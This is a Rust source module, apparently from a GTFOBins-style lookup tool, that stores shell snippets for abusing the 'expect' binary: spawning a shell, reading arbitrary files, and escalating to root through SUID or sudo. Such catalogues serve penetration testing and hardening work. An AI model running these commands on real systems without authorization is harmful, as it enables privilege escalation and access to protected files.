
pub static BIN_NAME: &'static str = "expect";
pub static SH_CODE: &'static str = r#"
    
    expect -c 'spawn /bin/sh;interact'
"#;
pub static FR_DESC: &'static str = "The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    expect $LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which expect) .

    ./expect -c 'spawn /bin/sh -p;interact'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo expect -c 'spawn /bin/sh;interact'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
